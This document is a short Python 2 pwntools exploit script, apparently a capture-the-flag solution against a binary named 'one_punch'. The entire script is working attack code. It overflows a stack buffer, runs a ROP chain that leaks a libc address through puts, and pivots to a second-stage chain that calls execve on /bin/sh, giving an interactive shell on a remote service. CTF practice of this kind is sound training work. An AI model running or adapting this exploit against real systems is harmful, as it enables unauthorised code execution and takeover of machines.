#!/usr/bin/python2

from pwn import *

exe = ELF("one_punch_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

pop_rdi = 0x00000000004011ca
pop_rbp = 0x00000000004011ad#: pop rbp; ret;
puts_plt = 0x401030
gets_plt = 0x401090
leave = 0x401264

def main():
    r = conn()

    payload = "A"*88
    #payload += p64(0x004010c0)
    payload += p64(pop_rdi)
    #payload += p64(0)
    payload += p64(exe.got["puts"])
    payload += p64(puts_plt)
    payload += p64(pop_rdi)
    payload += p64(0x404600)#write stage 2
    payload += p64(gets_plt)
    payload += p64(pop_rbp)
    payload += p64(0x404600)
    payload += p64(leave)
    #gdb.attach(r)
    gdb.attach(r)
    r.sendlineafter("?\n", payload)


    libc = u64(r.recv(6) + '\x00\x00') - 0x72C10
    log.info(hex(libc))

    pop_rax = libc + 0x000000000003c863#: pop rax; ret;
    pop_rdx = libc + 0x000000000004e062#: pop rdx; ret;
    pop_rbx = libc + 0x000000000002e211#: pop rbx; ret;
    pop_rsi = libc + 0x0000000000025641#: pop rsi; ret;
    syscall = libc + 0x00000000000829e6#: syscall; ret;

    payload2 =  p64(0)
    payload2 += p64(pop_rdi)
    payload2 += p64(0x404660)
    payload2 += p64(pop_rsi)
    payload2 += p64(0)
    payload2 += p64(pop_rdx)
    payload2 += p64(0)
    payload2 += p64(pop_rax)
    payload2 += p64(59)
    payload2 += p64(syscall)
    payload2 += p64(0)*2
    payload2 += '/bin/sh'

    r.sendline(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
